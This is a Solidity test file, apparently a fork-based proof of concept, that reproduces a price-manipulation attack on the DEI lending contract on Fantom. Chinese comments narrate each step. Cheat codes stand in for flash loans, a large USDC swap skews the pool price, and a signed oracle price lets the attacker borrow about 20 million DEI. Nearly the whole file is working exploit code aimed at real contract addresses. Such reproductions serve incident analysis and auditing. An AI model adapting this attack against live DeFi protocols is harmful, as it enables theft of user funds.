// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "./CheatCodes.sol";

interface IUSDC {

    function Swapin(
        bytes32 txhash,
        address account,
        uint256 amount
    ) external returns (bool);


    function transfer(address to, uint256 value) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

}

interface IERC20 {

    function transfer(address to, uint256 value) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

}

interface IBaseV1Router01 {

    function addLiquidity(
        address tokenA,
        address tokenB,
        bool stable,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );



    function swapExactTokensForTokensSimple(
        uint256 amountIn,
        uint256 amountOutMin,
        address tokenFrom,
        address tokenTo,
        bool stable,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);


}


interface IDeiLenderSolidex {

    function addCollateral(address to, uint256 amount) external;

    function borrow(
        address to,
        uint256 amount,
        uint256 price,
        uint256 timestamp,
        bytes memory reqId,
        SchnorrSign[] memory sigs
    ) external returns (uint256 debt);
}

interface ISSPv4 {

    function buyDei(uint256 amountIn) external;

}

interface ILpDepositor{

    function deposit(address pool, uint256 amount) external;

}


interface IOracle {
    function getOnChainPrice() external view returns (uint256);
}

struct SchnorrSign {
    uint256 signature;
    address owner;
    address nonce;
}



contract ContractTest is DSTest{

    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IBaseV1Router01  router = IBaseV1Router01(0xa38cd27185a464914D3046f0AB9d43356B34829D);

    IDeiLenderSolidex  DeiLenderSolidex = IDeiLenderSolidex(0x8D643d954798392403eeA19dB8108f595bB8B730);

    IUSDC usdc = IUSDC(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);

    IERC20  dei = IERC20(0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3);

    ISSPv4 sspv4 = ISSPv4(0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1);

    IERC20  lpToken = IERC20(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0);

    IERC20  DepositToken  = IERC20(0xD82001B651F7fb67Db99C679133F384244e20E79);



    address owner_of_usdc = 0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE;


    ILpDepositor LpDepositor = ILpDepositor(0x26E1A0d851CF28E697870e1b7F053B605C8b060F);

    IOracle  oracle = IOracle(0x8129026c585bCfA530445a6267f9389057761A00);



    function testExample() public {

        // 1. 攻击者从以太主网上跨链转过来200多万的USDC作为初始攻击资金
        // 跨链无法模拟 这里我就直接让USDC的owner给我mintUSDC好了
  
        // 又因为攻击者丧心病狂地 对19个池子 嵌套调用闪电贷,借了1.43亿的USDC 几乎借空了Fantom上能借到的所有USDC

        // 既然可以通过作弊直接mint, 我就懒得写闪电贷的嵌套和逻辑判断了...
        // 直接让USDC的owner 总共给我mint了 1.5 亿的USDC

        cheat.prank(owner_of_usdc);

        usdc.Swapin(0x33e48143c6ea17476eeabfa202d8034190ea3f2280b643e2570c54265fe33c98, address(this), 150000000*10**6);
        

        uint balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC I have now",balance_of_usdc);


        // 2. 用100万USDC 去购买 DEI

        usdc.approve(address(sspv4), type(uint256).max);

        sspv4.buyDei(1000000*10**6);

        uint balance_of_dei = dei.balanceOf(address(this));

        emit log_named_uint("The DEI after buying DEI",balance_of_dei);

        balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC after buying DEI",balance_of_usdc);

        // 3. 添加usdc-dei的流动性, 获取LP Token

        usdc.approve(address(router), type(uint256).max);

        dei.approve(address(router), type(uint256).max);
        // 这里添加流动行的数量与攻击者相同
        router.addLiquidity(address(dei), address(usdc), true, 894048109294000000000000, 965495000000, 876167147108120000000000, 946185100000, address(this), block.timestamp);

        uint balance_of_LpToken = lpToken.balanceOf(address(this));

        emit log_named_uint("The LPToken After adding Liquidity",balance_of_LpToken);


        // 4. 把LpToken 质押在Solidex Finance: LP Depositor中

        lpToken.approve(address(LpDepositor), type(uint256).max);

        LpDepositor.deposit(address(lpToken), balance_of_LpToken);

        balance_of_LpToken = lpToken.balanceOf(address(this));

        uint balance_of_DepositToken = DepositToken.balanceOf(address(this));

        emit log_named_uint("The DepositToken After depositting LPtoken",balance_of_DepositToken);

        // 5. 把DepositToken质押DeiLenderSolidex中

        DepositToken.approve(address(DeiLenderSolidex), type(uint256).max);

        DeiLenderSolidex.addCollateral(address(this), balance_of_DepositToken);

        balance_of_DepositToken = DepositToken.balanceOf(address(this));

        emit log_named_uint("The DepositToken After addCollateral",balance_of_DepositToken);

        
        balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC I have now",balance_of_usdc);

        // 7. 用所有的USDC换DEI

        usdc.approve(address(router), type(uint256).max);

        router.swapExactTokensForTokensSimple(143200000000000, 0, address(usdc), address(dei), true, address(this), block.timestamp);

        balance_of_dei = dei.balanceOf(address(this));

        emit log_named_uint("The DEI I have after swapping",balance_of_dei);


        
        // 8. 在DeiLenderSolidex上借大量的DEI

        SchnorrSign  memory sig = SchnorrSign(1835036472718200664753898924933875196349373787186253604571797551094739683650,0xF096EC73cB49B024f1D93eFe893E38337E7a099a,0xD58D8931b98942EE19C431B72f4Bc8B3eD28d8DF);


        SchnorrSign[] memory sigs = new SchnorrSign[](1);
        
        sigs[0] = sig;

        bytes memory repID = "0x01701220183a8e97b39ebe3c38b6166cd7c9ddfe3c38fd76352e5652b9c25467aa47b040";
    

        uint price = oracle.getOnChainPrice();

        emit log_named_uint("The price from Oracle", price);

        cheat.warp(1651113560);

        emit log_named_uint("the time now",block.timestamp);

        DeiLenderSolidex.borrow(address(this), 17246885701212305622476302, 20923953265992870251804289, 1651113560, repID, sigs);

        balance_of_dei = dei.balanceOf(address(this));

        // 可以看到我们借到了2000多万的DEI

        emit log_named_uint("The DEI after borrowing", balance_of_dei);


        // 9. 用将近一半的DEI换回USDC, 用以归还闪电贷

        router.swapExactTokensForTokensSimple(12000000000000000000000000, 0, address(dei), address(usdc), true, address(this), block.timestamp);

        // 10. 归还闪电贷

        // 这里直接把1.5亿的USDC还给 owner, 假设这是一个闪电贷的流程...
        
        usdc.transfer(owner_of_usdc, 150000000*10**6);

        balance_of_dei = dei.balanceOf(address(this));

        balance_of_usdc = usdc.balanceOf(address(this));

        emit log_named_uint("The USDC after paying back", balance_of_usdc);

        emit log_named_uint("The DEI after paying back", balance_of_dei);

    }
}
